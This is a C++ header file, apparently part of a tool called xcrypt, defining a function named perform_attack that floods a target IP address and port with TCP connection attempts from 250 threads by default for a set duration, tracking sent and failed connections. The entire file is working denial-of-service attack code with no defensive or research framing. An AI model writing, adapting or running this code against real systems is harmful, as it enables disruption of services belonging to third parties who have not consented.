#pragma once
#include "../core/thread_pool.hpp"
#include "../utils/stats_tracker.hpp"

#include <chrono>
#include <cstring>
#include <unistd.h>
#include <thread>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>

namespace xcrypt {

    inline void perform_attack(const std::string& target_ip,
                               int port,
                               int duration,
                               StatsTracker& stats,
                               int threads = 250) {
        ThreadPool pool(threads);
        auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(duration);

        sockaddr_in target_addr{};
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(port);
        inet_pton(AF_INET, target_ip.c_str(), &target_addr.sin_addr);

        for (int i = 0; i < threads; ++i) {
            pool.enqueue([=, &stats]() {
                while (std::chrono::steady_clock::now() < end_time) {
                    int sock = socket(AF_INET, SOCK_STREAM, 0);
                    if (sock < 0) {
                        stats.increment_error();
                        continue;
                    }

                    struct timeval timeout;
                    timeout.tv_sec = 2;
                    timeout.tv_usec = 0;
                    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
                    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));

                    int conn = connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
                    if (conn == 0) {
                        stats.increment_sent();
                    } else {
                        stats.increment_error();
                    }

                    close(sock);
                }
            });
        }
    }

}